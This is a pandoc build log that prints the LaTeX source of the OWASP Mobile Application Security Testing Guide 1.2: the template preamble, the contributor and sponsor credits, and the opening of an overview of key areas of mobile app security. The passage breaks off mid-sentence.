Version = 1.2
Generating Document
FOLDER=Document-temp
VERSION=1.2
processing image tags and pagebreaks in Document-temp/0x*.md, using en
Done processing tags and breaks in Document-temp
Create PDF
[makePDF] temp dir:
/tmp/tex2pdf.-b81d3c9506d190f0
[makePDF] Command line:
xelatex "-halt-on-error" "-interaction" "nonstopmode" "-output-directory" "/tmp/tex2pdf.-b81d3c9506d190f0" "/tmp/tex2pdf.-b81d3c9506d190f0/input.tex"

[makePDF] Environment:
("TEXINPUTS","/tmp/tex2pdf.-b81d3c9506d190f0:")
("TEXMFOUTPUT","/tmp/tex2pdf.-b81d3c9506d190f0")
("LANG","C.UTF-8")
("HOSTNAME","148c340c1bf7")
("DEBCONF_NOWARNINGS","yes")
("PWD","/pandoc")
("HOME","/")
("DEBIAN_FRONTEND","noninteractive")
("TEXMFLOCAL","/usr/local/share/texmf")
("LANGUAGETEXT","")
("DEBIAN_PRIORITY","critical")
("TOC_TITLE","Table of Contents")
("SHLVL","2")
("LANGUAGE","en")
("PATH","/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin")
("_","/usr/bin/pandoc")

[makePDF] Source:
%%
% Copyright (c) 2017 - 2020, Pascal Wagler;
% Copyright (c) 2014 - 2020, John MacFarlane
%
% All rights reserved.
%
% Redistribution and use in source and binary forms, with or without
% modification, are permitted provided that the following conditions
% are met:
%
% - Redistributions of source code must retain the above copyright
% notice, this list of conditions and the following disclaimer.
%
% - Redistributions in binary form must reproduce the above copyright
% notice, this list of conditions and the following disclaimer in the
% documentation and/or other materials provided with the distribution.
%
% - Neither the name of John MacFarlane nor the names of other
% contributors may be used to endorse or promote products derived
% from this software without specific prior written permission.
%
% THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
% "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
% LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
% FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
% COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
% INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
% BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
% LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
% CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
% LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
% ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
% POSSIBILITY OF SUCH DAMAGE.
%%

%%
% This is the Eisvogel pandoc LaTeX template.
%
% For usage information and examples visit the official GitHub page:
% https://github.com/Wandmalfarbe/pandoc-latex-template
%%

% Options for packages loaded elsewhere
\PassOptionsToPackage{unicode}{hyperref}
\PassOptionsToPackage{hyphens}{url}
\PassOptionsToPackage{dvipsnames,svgnames*,x11names*,table}{xcolor}
%
\documentclass[
  a4paper,
,tablecaptionabove
]{scrartcl}
\usepackage{lmodern}
\usepackage{setspace}
\setstretch{1.2}
\usepackage{amssymb,amsmath}
\usepackage{ifxetex,ifluatex}
\ifnum 0\ifxetex 1\fi\ifluatex 1\fi=0 % if pdftex
  \usepackage[T1]{fontenc}
  \usepackage[utf8]{inputenc}
  \usepackage{textcomp} % provide euro and other symbols
\else % if luatex or xetex
  \usepackage{unicode-math}
  \defaultfontfeatures{Scale=MatchLowercase}
  \defaultfontfeatures[\rmfamily]{Ligatures=TeX,Scale=1}
\fi
% Use upquote if available, for straight quotes in verbatim environments
\IfFileExists{upquote.sty}{\usepackage{upquote}}{}
\IfFileExists{microtype.sty}{% use microtype if available
  \usepackage[]{microtype}
  \UseMicrotypeSet[protrusion]{basicmath} % disable protrusion for tt fonts
}{}
\makeatletter
\@ifundefined{KOMAClassName}{% if non-KOMA class
  \IfFileExists{parskip.sty}{%
    \usepackage{parskip}
  }{% else
    \setlength{\parindent}{0pt}
    \setlength{\parskip}{6pt plus 2pt minus 1pt}}
}{% if KOMA class
  \KOMAoptions{parskip=half}}
\makeatother
\usepackage{xcolor}
\definecolor{default-linkcolor}{HTML}{A50000}
\definecolor{default-filecolor}{HTML}{A50000}
\definecolor{default-citecolor}{HTML}{4077C0}
\definecolor{default-urlcolor}{HTML}{4077C0}
\IfFileExists{xurl.sty}{\usepackage{xurl}}{} % add URL line breaks if available
\IfFileExists{bookmark.sty}{\usepackage{bookmark}}{\usepackage{hyperref}}
\hypersetup{
  pdftitle={OWASP Mobile Application Security Testing Guide 1.2},
  colorlinks=true,
  linkcolor=blue,
  filecolor=default-filecolor,
  citecolor=default-citecolor,
  urlcolor=default-urlcolor,
  breaklinks=true,
  pdfcreator={LaTeX via pandoc with the Eisvogel template}}
\urlstyle{same} % disable monospaced font for URLs
\usepackage[margin=2.5cm,includehead=true,includefoot=true,centering,]{geometry}
\usepackage{color}
\usepackage{fancyvrb}
\newcommand{\VerbBar}{|}
\newcommand{\VERB}{\Verb[commandchars=\\\{\}]}
\DefineVerbatimEnvironment{Highlighting}{Verbatim}{commandchars=\\\{\}}
% Add ',fontsize=\small' for more characters per line
\newenvironment{Shaded}{}{}
\newcommand{\AlertTok}[1]{\textcolor[rgb]{1.00,0.00,0.00}{\textbf{#1}}}
\newcommand{\AnnotationTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{#1}}}}
\newcommand{\AttributeTok}[1]{\textcolor[rgb]{0.49,0.56,0.16}{#1}}
\newcommand{\BaseNTok}[1]{\textcolor[rgb]{0.25,0.63,0.44}{#1}}
\newcommand{\BuiltInTok}[1]{#1}
\newcommand{\CharTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{#1}}
\newcommand{\CommentTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textit{#1}}}
\newcommand{\CommentVarTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{#1}}}}
\newcommand{\ConstantTok}[1]{\textcolor[rgb]{0.53,0.00,0.00}{#1}}
\newcommand{\ControlFlowTok}[1]{\textcolor[rgb]{0.00,0.44,0.13}{\textbf{#1}}}
\newcommand{\DataTypeTok}[1]{\textcolor[rgb]{0.56,0.13,0.00}{#1}}
\newcommand{\DecValTok}[1]{\textcolor[rgb]{0.25,0.63,0.44}{#1}}
\newcommand{\DocumentationTok}[1]{\textcolor[rgb]{0.73,0.13,0.13}{\textit{#1}}}
\newcommand{\ErrorTok}[1]{\textcolor[rgb]{1.00,0.00,0.00}{\textbf{#1}}}
\newcommand{\ExtensionTok}[1]{#1}
\newcommand{\FloatTok}[1]{\textcolor[rgb]{0.25,0.63,0.44}{#1}}
\newcommand{\FunctionTok}[1]{\textcolor[rgb]{0.02,0.16,0.49}{#1}}
\newcommand{\ImportTok}[1]{#1}
\newcommand{\InformationTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{#1}}}}
\newcommand{\KeywordTok}[1]{\textcolor[rgb]{0.00,0.44,0.13}{\textbf{#1}}}
\newcommand{\NormalTok}[1]{#1}
\newcommand{\OperatorTok}[1]{\textcolor[rgb]{0.40,0.40,0.40}{#1}}
\newcommand{\OtherTok}[1]{\textcolor[rgb]{0.00,0.44,0.13}{#1}}
\newcommand{\PreprocessorTok}[1]{\textcolor[rgb]{0.74,0.48,0.00}{#1}}
\newcommand{\RegionMarkerTok}[1]{#1}
\newcommand{\SpecialCharTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{#1}}
\newcommand{\SpecialStringTok}[1]{\textcolor[rgb]{0.73,0.40,0.53}{#1}}
\newcommand{\StringTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{#1}}
\newcommand{\VariableTok}[1]{\textcolor[rgb]{0.10,0.09,0.49}{#1}}
\newcommand{\VerbatimStringTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{#1}}
\newcommand{\WarningTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{#1}}}}

% Workaround/bugfix from jannick0.
% See https://github.com/jgm/pandoc/issues/4302#issuecomment-360669013)
% or https://github.com/Wandmalfarbe/pandoc-latex-template/issues/2
%
% Redefine the verbatim environment 'Highlighting' to break long lines (with
% the help of fvextra). Redefinition is necessary because it is unlikely that
% pandoc includes fvextra in the default template.
\usepackage{fvextra}
\DefineVerbatimEnvironment{Highlighting}{Verbatim}{breaklines,fontsize=\small,commandchars=\\\{\}}

\usepackage{longtable,booktabs}
% Correct order of tables after \paragraph or \subparagraph
\usepackage{etoolbox}
\makeatletter
\patchcmd\longtable{\par}{\if@noskipsec\mbox{}\fi\par}{}{}
\makeatother
% Allow footnotes in longtable head/foot
\IfFileExists{footnotehyper.sty}{\usepackage{footnotehyper}}{\usepackage{footnote}}
\makesavenoteenv{longtable}
% add backlinks to footnote references, cf. https://tex.stackexchange.com/questions/302266/make-footnote-clickable-both-ways
\usepackage{footnotebackref}
\usepackage{graphicx,grffile}
\makeatletter
\def\maxwidth{\ifdim\Gin@nat@width>\linewidth\linewidth\else\Gin@nat@width\fi}
\def\maxheight{\ifdim\Gin@nat@height>\textheight\textheight\else\Gin@nat@height\fi}
\makeatother
% Scale images if necessary, so that they will not overflow the page
% margins by default, and it is still possible to overwrite the defaults
% using explicit options in \includegraphics[width, height, ...]{}
\setkeys{Gin}{width=\maxwidth,height=\maxheight,keepaspectratio}
\setlength{\emergencystretch}{3em}  % prevent overfull lines
\providecommand{\tightlist}{%
  \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}
\setcounter{secnumdepth}{-\maxdimen} % remove section numbering

% Make use of float-package and set default placement for figures to H.
% The option H means 'PUT IT HERE' (as  opposed to the standard h option which means 'You may put it here if you like').
\usepackage{float}
\floatplacement{figure}{H}

\usepackage{sectsty}
\sectionfont{\LARGE\clearpage}

\usepackage{hyperref}

\hypersetup{
  pdftitle={OWASP Mobile Application Security Testing Guide},
  pdfauthor={Sven Schleier, Jeroen Willemsen and Carlos Holguera},
  pdfsubject={The Mobile Application Security Testing Guide (MASVS) is a guide for developers and testers.},
  pdfkeywords={Mobile Security,iOS,Android,OWASP}
}

\usepackage{incgraph,tikz}

% Make "clones" of the commands
\let\originalparagraph\paragraph
\let\originalsubparagraph\subparagraph

% Redefine the commands using the "clones"
\renewcommand{\paragraph}[1]%
{\originalparagraph{#1}\hfill}
\renewcommand{\subparagraph}[1]%
{\originalsubparagraph{#1}\hfill}

% Remove all captions
\renewcommand{\caption}[2][]{}

% TODO for colored tables: add this to pandocker command -V table-use-row-colors=true

\usepackage{geometry}

\geometry{
    a4paper,
    left=20mm,
    top=20mm,
    headheight=40pt,
    voffset=20pt,
    footskip=50pt %40pt gives some more space at the bottom: test it!
}

\title{OWASP Mobile Application Security Testing Guide 1.2}
\date{}



%%
%% added
%%

%
% language specification
%
% If no language is specified, use English as the default main document language.
%

\ifnum 0\ifxetex 1\fi\ifluatex 1\fi=0 % if pdftex
  \usepackage[shorthands=off,main=english]{babel}
\else
    % Workaround for bug in Polyglossia that breaks `\familydefault` when `\setmainlanguage` is used.
  % See https://github.com/Wandmalfarbe/pandoc-latex-template/issues/8
  % See https://github.com/reutenauer/polyglossia/issues/186
  % See https://github.com/reutenauer/polyglossia/issues/127
  \renewcommand*\familydefault{\sfdefault}
    % load polyglossia as late as possible as it *could* call bidi if RTL lang (e.g. Hebrew or Arabic)
  \usepackage{polyglossia}
  \setmainlanguage[]{english}
\fi



%
% for the background color of the title page
%

%
% break urls
%
\PassOptionsToPackage{hyphens}{url}

%
% When using babel or polyglossia with biblatex, loading csquotes is recommended
% to ensure that quoted texts are typeset according to the rules of your main language.
%
\usepackage{csquotes}

%
% captions
%
\definecolor{caption-color}{HTML}{777777}
\usepackage[font={stretch=1.2}, textfont={color=caption-color}, position=top, skip=4mm, labelfont=bf, singlelinecheck=false, justification=raggedright]{caption}
\setcapindent{0em}

%
% blockquote
%
\definecolor{blockquote-border}{RGB}{221,221,221}
\definecolor{blockquote-text}{RGB}{119,119,119}
\usepackage{mdframed}
\newmdenv[rightline=false,bottomline=false,topline=false,linewidth=3pt,linecolor=blockquote-border,skipabove=\parskip]{customblockquote}
\renewenvironment{quote}{\begin{customblockquote}\list{}{\rightmargin=0em\leftmargin=0em}%
\item\relax\color{blockquote-text}\ignorespaces}{\unskip\unskip\endlist\end{customblockquote}}

%
% Source Sans Pro as the de­fault font fam­ily
% Source Code Pro for monospace text
%
% 'default' option sets the default
% font family to Source Sans Pro, not \sfdefault.
%
\ifnum 0\ifxetex 1\fi\ifluatex 1\fi=0 % if pdftex
    \usepackage[default]{sourcesanspro}
  \usepackage{sourcecodepro}
  \else % if not pdftex
    \usepackage[default]{sourcesanspro}
  \usepackage{sourcecodepro}

  % XeLaTeX specific adjustments for straight quotes: https://tex.stackexchange.com/a/354887
  % This issue is already fixed (see https://github.com/silkeh/latex-sourcecodepro/pull/5) but the
  % fix is still unreleased.
  % TODO: Remove this workaround when the new version of sourcecodepro is released on CTAN.
  \ifxetex
    \makeatletter
    \defaultfontfeatures[\ttfamily]
      { Numbers   = \sourcecodepro@figurestyle,
        Scale     = \SourceCodePro@scale,
        Extension = .otf }
    \setmonofont
      [ UprightFont    = *-\sourcecodepro@regstyle,
        ItalicFont     = *-\sourcecodepro@regstyle It,
        BoldFont       = *-\sourcecodepro@boldstyle,
        BoldItalicFont = *-\sourcecodepro@boldstyle It ]
      {SourceCodePro}
    \makeatother
  \fi
  \fi

%
% heading color
%
\definecolor{heading-color}{RGB}{40,40,40}
\addtokomafont{section}{\color{heading-color}}
% When using the classes report, scrreprt, book,
% scrbook or memoir, uncomment the following line.
%\addtokomafont{chapter}{\color{heading-color}}

%
% variables for title and author
%
\usepackage{titling}
\title{OWASP Mobile Application Security Testing Guide 1.2}
\author{}

%
% tables
%

\definecolor{table-row-color}{HTML}{F5F5F5}
\definecolor{table-rule-color}{HTML}{999999}

%\arrayrulecolor{black!40}
\arrayrulecolor{table-rule-color}     % color of \toprule, \midrule, \bottomrule
\setlength\heavyrulewidth{0.3ex}      % thickness of \toprule, \bottomrule
\renewcommand{\arraystretch}{1.3}     % spacing (padding)


%
% remove paragraph indention
%
\setlength{\parindent}{0pt}
\setlength{\parskip}{6pt plus 2pt minus 1pt}
\setlength{\emergencystretch}{3em}  % prevent overfull lines

%
%
% Listings
%
%


%
% header and footer
%
\usepackage{fancyhdr}

\fancypagestyle{eisvogel-header-footer}{
  \fancyhead{}
  \fancyfoot{}
  \lhead[]{OWASP Mobile Application Security Testing Guide 1.2}
  \chead[]{}
  \rhead[OWASP Mobile Application Security Testing Guide 1.2]{}
  \lfoot[\thepage]{}
  \cfoot[]{}
  \rfoot[]{\thepage}
  \renewcommand{\headrulewidth}{0.4pt}
  \renewcommand{\footrulewidth}{0.4pt}
}
\pagestyle{eisvogel-header-footer}

%%
%% end added
%%

\begin{document}

%%
%% begin titlepage
%%

%%
%% end titlepage
%%



% IMPORTANT NOTE this file requires latex-header.tex
% cover.jpg is in the root folder (owasp-MSTG/)
% Version text is written at (X,Y), where (0, 0) is the lower left corner of the page.

\thispagestyle{empty} % remove page numbers

% https://tex.stackexchange.com/questions/136900/insert-a-full-page-image
\incgraph[documentpaper, 
    overlay={\node[white] at (12.3,10.3) {\Large Version 1.2};}]
    [width=\paperwidth,height=\paperheight]{cover.jpg}

\thispagestyle{empty} % remove page numbers

OWASP Mobile Application Security Testing Guide


Version 1.2 \today

\renewcommand*\contentsname{Table of Contents}
{
\hypersetup{linkcolor=}
\setcounter{tocdepth}{3}
\tableofcontents
}
\hypertarget{mobile-application-security-testing-guide}{%
\section{Mobile Application Security Testing
Guide}\label{mobile-application-security-testing-guide}}

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/6c9ef3f29742285f2d7e09d0c076a66855521a28.png}
\caption{OWASP Logo}
\end{figure}

\hypertarget{frontispiece}{%
\section{Frontispiece}\label{frontispiece}}

\hypertarget{about-the-owasp-mobile-security-testing-guide}{%
\subsection{About the OWASP Mobile Security Testing
Guide}\label{about-the-owasp-mobile-security-testing-guide}}

The OWASP Mobile Security Testing Guide (MSTG) is a comprehensive manual
for testing the security of mobile apps. It describes processes and
techniques for verifying the requirements listed in the
\href{https://github.com/OWASP/owasp-masvs}{Mobile Application Security
Verification Standard (MASVS)}, and provides a baseline for complete and
consistent security tests.

OWASP thanks the many authors, reviewers, and editors for their hard
work in developing this guide. If you have any comments or suggestions
on the Mobile Security Testing Guide, please join the discussion around
MASVS and MSTG in the
\href{https://owasp.slack.com/messages/project-mobile_omtg/details/}{OWASP
Mobile Security Project Slack Channel}. You can sign up for the Slack
channel yourself using \href{https://owasp-slack.herokuapp.com/}{this
URL}. (Please open a Pull Request in our Github Repo if the invite has
expired.)

\hypertarget{disclaimer}{%
\subsection{Disclaimer}\label{disclaimer}}

Please consult the laws in your country before executing any tests
against mobile apps by utilizing the MSTG materials. Refrain from
violating the laws with anything described in the MSTG.

Our
\href{https://github.com/OWASP/owasp-mstg/blob/master/CODE_OF_CONDUCT.md}{Code
of Conduct} has further details.

\hypertarget{copyright-and-license}{%
\subsection{Copyright and License}\label{copyright-and-license}}

Copyright © 2018 The OWASP Foundation. This work is licensed under a
\href{https://creativecommons.org/licenses/by-sa/4.0/}{Creative Commons
Attribution-ShareAlike 4.0 International License}. For any reuse or
distribution, you must make clear to others the license terms of this
work.

\begin{figure}
\centering
\includegraphics[width=1.5625in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/997b3fc8f69d8fa1fd9853b14a99a208461549eb.png}
\caption{drawing}
\end{figure}

\hypertarget{isbn}{%
\subsection{ISBN}\label{isbn}}

Our ISBN Number is 978-0-359-47489-9.

\hypertarget{acknowledgments}{%
\subsection{Acknowledgments}\label{acknowledgments}}

\textbf{Note}: This contributor table is generated based on our
\href{https://github.com/OWASP/owasp-mstg/graphs/contributors}{GitHub
contribution statistics}. For more information on these stats, see the
\href{https://github.com/OWASP/owasp-mstg/blob/master/README.md}{GitHub
Repository README}. We manually update the table, so be patient if
you're not listed immediately.

\hypertarget{authors}{%
\subsubsection{Authors}\label{authors}}

\hypertarget{bernhard-mueller}{%
\paragraph{Bernhard Mueller}\label{bernhard-mueller}}

Bernhard is a cyber security specialist with a talent for hacking
systems of all kinds. During more than a decade in the industry, he has
published many zero-day exploits for software such as MS SQL Server,
Adobe Flash Player, IBM Director, Cisco VOIP, and ModSecurity. If you
can name it, he has probably broken it at least once. BlackHat USA
commended his pioneering work in mobile security with a Pwnie Award for
Best Research.

\hypertarget{sven-schleier}{%
\paragraph{Sven Schleier}\label{sven-schleier}}

Sven is an experienced web and mobile penetration tester and assessed
everything from historic Flash applications to progressive mobile apps.
He is also a security engineer that supported many projects end-to-end
during the SDLC to ``build security in''. He was speaking at local and
international meetups and conferences and is conducting hands-on
workshops about web application and mobile app security.

\hypertarget{jeroen-willemsen}{%
\paragraph{Jeroen Willemsen}\label{jeroen-willemsen}}

Jeroen is a principal security architect at Xebia with a passion for
mobile security and risk management. He has supported companies as a
security coach, a security engineer and as a full-stack developer, which
makes him a jack of all trades. He loves explaining technical subjects:
from security issues to programming challenges.

\hypertarget{carlos-holguera}{%
\paragraph{Carlos Holguera}\label{carlos-holguera}}

Carlos is a security engineer leading the mobile penetration testing
team at ESCRYPT. He has gained many years of hands-on experience in the
field of security testing for mobile apps and embedded systems such as
automotive control units and IoT devices. He is passionate about reverse
engineering and dynamic instrumentation of mobile apps and is
continuously learning and sharing his knowledge.

\hypertarget{co-authors}{%
\subsubsection{Co-Authors}\label{co-authors}}

Co-authors have consistently contributed quality content and have at
least 2,000 additions logged in the GitHub repository.

\hypertarget{romuald-szkudlarek}{%
\paragraph{Romuald Szkudlarek}\label{romuald-szkudlarek}}

Romuald is a passionate cyber security \& privacy professional with over
15 years of experience in the web, mobile, IoT and cloud domains. During
his career, he has been dedicating his spare time to a variety of
projects with the goal of advancing the sectors of software and
security. He is teaching regularly at various institutions. He holds
CISSP, CCSP, CSSLP, and CEH credentials.

\hypertarget{jeroen-beckers}{%
\paragraph{Jeroen Beckers}\label{jeroen-beckers}}

Jeroen is the mobile security lead at NVISO where he is responsible for
quality assurance on mobile security projects and for R\&D on all things
mobile. He worked as a Flash developer during high school and college,
but switched to a career in cybersecurity once he graduated and now has
more than 5 years of experience in mobile security. He loves sharing his
knowledge with other people, as is demonstrated by his many talks \&
trainings at colleges, universities, clients and conferences.

\hypertarget{vikas-gupta}{%
\paragraph{Vikas Gupta}\label{vikas-gupta}}

Vikas is an experienced cyber security researcher, with expertise in
mobile security. In his career he has worked to secure applications for
various industries including fintech, banks and governments. He enjoys
reverse engineering, especially obfuscated native code and cryptography.
He holds masters in security and mobile computing, and an OSCP
certification. He is always open to share his knowledge and exchange
ideas.

\hypertarget{top-contributors}{%
\subsubsection{Top Contributors}\label{top-contributors}}

Top contributors have consistently contributed quality content and have
at least 500 additions logged in the GitHub repository.

\begin{itemize}
\tightlist
\item
  Pawel Rzepa
\item
  Francesco Stillavato
\item
  Henry Hoggard
\item
  Andreas Happe
\item
  Kyle Benac
\item
  Paulino Calderon
\item
  Alexander Anthuk
\item
  Caleb Kinney
\item
  Abderrahmane Aftahi
\item
  Koki Takeyama
\item
  Wen Bin Kong
\item
  Abdessamad Temmar
\item
  Cláudio André
\item
  Slawomir Kosowski
\item
  Bolot Kerimbaev
\end{itemize}

\hypertarget{contributors}{%
\subsubsection{Contributors}\label{contributors}}

Contributors have contributed quality content and have at least 50
additions logged in the GitHub repository.

Jin Kung Ong, Lukasz Wierzbicki, Sjoerd Langkemper, Gerhard Wagner,
Michael Helwig, Pece Milosev, Ryan Teoh, Denis Pilipchuk, José Carlos
Andreu, Dharshin De Silva, Anatoly Rosencrantz, Caitlin Andrews, Abhinav
Sejpal, Anita Diamond, Raul Siles, Yogesh Sharma, Dominique RIGHETTO,
Enrico Verzegnassi, Nick Epson, Anna Szkudlarek, Elie Saad, Prathan
Phongthiproek, Tom Welch, Luander Ribeiro, Heaven L. Hodges, Shiv Sahni,
Akanksha Bana, Dario Incalza, Murat Karaoz, Jason Doyle, Oguzhan Topgul,
Ender IBL, Imani Sherman, magicansk, Sijo Abraham, Pishu Mahtani, Jay
Mbolda, Anuruddha E., @legik, Emil Tostrup

\hypertarget{reviewers}{%
\subsubsection{Reviewers}\label{reviewers}}

Reviewers have consistently provided useful feedback through GitHub
issues and pull request comments.

\begin{itemize}
\tightlist
\item
  Jeroen Beckers
\item
  Sjoerd Langkemper
\item
  Anant Shrivastava
\end{itemize}

\hypertarget{editors}{%
\subsubsection{Editors}\label{editors}}

\begin{itemize}
\tightlist
\item
  Heaven Hodges
\item
  Caitlin Andrews
\item
  Nick Epson
\item
  Anita Diamond
\item
  Anna Szkudlarek
\end{itemize}

\hypertarget{others}{%
\subsubsection{Others}\label{others}}

Many other contributors have committed small amounts of content, such as
a single word or sentence (less than 50 additions). The full list of
contributors is available on
\href{https://github.com/OWASP/owasp-mstg/graphs/contributors}{GitHub}.

\hypertarget{sponsors}{%
\subsubsection{Sponsors}\label{sponsors}}

While both the MASVS and the MSTG are created and maintained by the
community on a voluntary basis, sometimes a little bit of outside help
is required. We therefore thank our sponsors for providing the funds to
be able to hire technical editors. Note that their sponsorship does not
influence the content of the MASVS or MSTG in any way. The sponsorship
packages are described on the
\href{https://www.owasp.org/index.php/OWASP_Mobile_Security_Testing_Guide\#tab=Sponsorship_Packages}{OWASP
Project Wiki}.

\hypertarget{honorable-benefactor}{%
\paragraph{Honorable Benefactor}\label{honorable-benefactor}}

\href{https://www.nowsecure.com/}{\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/ccba17705245f8560d8a34338e189f56fd492cf8.png}}

\href{https://twitter.com/OWASPBayArea?ref_src=twsrc\%5Egoogle\%7Ctwcamp\%5Eserp\%7Ctwgr\%5Eauthor}{OWASP
Bay Area Chapter}

\hypertarget{good-samaritan-benefactor}{%
\paragraph{Good Samaritan Benefactor}\label{good-samaritan-benefactor}}

\href{https://www.randorisec.fr/}{\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/be368d70157fbfbee3a68fb706425b2117ca985a.png}}

\hypertarget{donators}{%
\paragraph{Donators}\label{donators}}

The following people and/or companies have donated more than \$25 using
Leanpub or other ways:

\begin{itemize}
\tightlist
\item
  eShard
\end{itemize}

\hypertarget{older-versions}{%
\subsubsection{Older Versions}\label{older-versions}}

The Mobile Security Testing Guide was initiated by Milan Singh Thakur in
2015. The original document was hosted on Google Drive. Guide
development was moved to GitHub in October 2016.

\hypertarget{owasp-mstg-beta-2-google-doc}{%
\paragraph{OWASP MSTG ``Beta 2'' (Google
Doc)}\label{owasp-mstg-beta-2-google-doc}}

\begin{longtable}[]{@{}lll@{}}
\toprule
\begin{minipage}[b]{0.30\columnwidth}\raggedright
Authors\strut
\end{minipage} & \begin{minipage}[b]{0.30\columnwidth}\raggedright
Reviewers\strut
\end{minipage} & \begin{minipage}[b]{0.30\columnwidth}\raggedright
Top Contributors\strut
\end{minipage}\tabularnewline
\midrule
\endhead
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Milan Singh Thakur, Abhinav Sejpal, Blessen Thomas, Dennis Titze, Davide
Cioccia, Pragati Singh, Mohammad Hamed Dadpour, David Fern, Ali Yazdani,
Mirza Ali, Rahil Parikh, Anant Shrivastava, Stephen Corbiaux, Ryan
Dewhurst, Anto Joseph, Bao Lee, Shiv Patel, Nutan Kumar Panda, Julian
Schütte, Stephanie Vanroelen, Bernard Wagner, Gerhard Wagner, Javier
Dominguez\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Andrew Muller, Jonathan Carter, Stephanie Vanroelen, Milan Singh
Thakur\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Jim Manico, Paco Hope, Pragati Singh, Yair Amit, Amin Lalji, OWASP
Mobile Team\strut
\end{minipage}\tabularnewline
\bottomrule
\end{longtable}

\hypertarget{owasp-mstg-beta-1-google-doc}{%
\paragraph{OWASP MSTG ``Beta 1'' (Google
Doc)}\label{owasp-mstg-beta-1-google-doc}}

\begin{longtable}[]{@{}lll@{}}
\toprule
\begin{minipage}[b]{0.30\columnwidth}\raggedright
Authors\strut
\end{minipage} & \begin{minipage}[b]{0.30\columnwidth}\raggedright
Reviewers\strut
\end{minipage} & \begin{minipage}[b]{0.30\columnwidth}\raggedright
Top Contributors\strut
\end{minipage}\tabularnewline
\midrule
\endhead
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Milan Singh Thakur, Abhinav Sejpal, Pragati Singh, Mohammad Hamed
Dadpour, David Fern, Mirza Ali, Rahil Parikh\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Andrew Muller, Jonathan Carter\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Jim Manico, Paco Hope, Yair Amit, Amin Lalji, OWASP Mobile Team\strut
\end{minipage}\tabularnewline
\bottomrule
\end{longtable}

\hypertarget{overview}{%
\section{Overview}\label{overview}}

\hypertarget{introduction-to-the-owasp-mobile-security-testing-guide}{%
\subsection{Introduction to the OWASP Mobile Security Testing
Guide}\label{introduction-to-the-owasp-mobile-security-testing-guide}}

New technology always introduces new security risks, and mobile
computing is no exception. Security concerns for mobile apps differ from
traditional desktop software in some important ways. Modern mobile
operating systems are arguably more secure than traditional desktop
operating systems, but problems can still appear when we don't carefully
consider security during mobile app development. Data storage, inter-app
communication, proper usage of cryptographic APIs, and secure network
communication are only some of these considerations.

\hypertarget{key-areas-in-mobile-application-security}{%
\subsubsection{Key Areas in Mobile Application
Security}\label{key-areas-in-mobile-application-security}}

Many mobile app penetration testers have a background in network and web
app penetration testing, a quality that is valuable for mobile app
testing. Almost every mobile app talks to a backend service, and those
services are prone to the same types of attacks we are familiar with in
web apps on desktop machines. Mobile apps differ in that there is a
smaller attack surface and therefore more security against injection and
similar attacks. Instead, we must prioritize data protection on the
device and the network to increase mobile security.

Let's discuss the key areas in mobile app security.

\hypertarget{local-data-storage}{%
\paragraph{Local Data Storage}\label{local-data-storage}}

The protection of sensitive data, such as user credentials and private
information, is crucial to mobile security. If an app uses operating
system APIs such as local storage or inter-process communication (IPC)
improperly, the app might expose sensitive data to other apps running on
the same device. It may also unintentionally leak data to cloud storage,
backups, or the keyboard cache. Additionally, mobile devices can be lost
or stolen more easily compared to other types of devices, so it's more
likely an individual can gain physical access to the device, making it
easier to retrieve the data.

When developing mobile apps, we must take extra care when storing user
data. For example, we can use appropriate key storage APIs and take
advantage of hardware-backed security features when available.

Fragmentation is a problem we deal with especially on Android devices.
Not every Android device offers hardware-backed secure storage, and many
devices are running outdated versions of Android. For an app to be
supported on these out-of-date devices, it would have to be created
using an older version of Android's API which may lack important
security features. For maximum security, the best choice is to create
apps with the current API version even though that excludes some users.

\hypertarget{communication-with-trusted-endpoints}{%
\paragraph{Communication with Trusted
Endpoints}\label{communication-with-trusted-endpoints}}

Mobile devices regularly connect to a variety of networks, including
public Wi-Fi networks shared with other (potentially malicious) clients.
This creates opportunities for a wide variety of network-based attacks
ranging from simple to complicated and old to new. It's crucial to
maintain the confidentiality and integrity of information exchanged
between the mobile app and remote service endpoints. As a basic
requirement, mobile apps must set up a secure, encrypted channel for
network communication using the TLS protocol with appropriate settings.

\hypertarget{authentication-and-authorization}{%
\paragraph{Authentication and
Authorization}\label{authentication-and-authorization}}

In most cases, sending users to log in to a remote service is an
integral part of the overall mobile app architecture. Even though most
of the authentication and authorization logic happens at the endpoint,
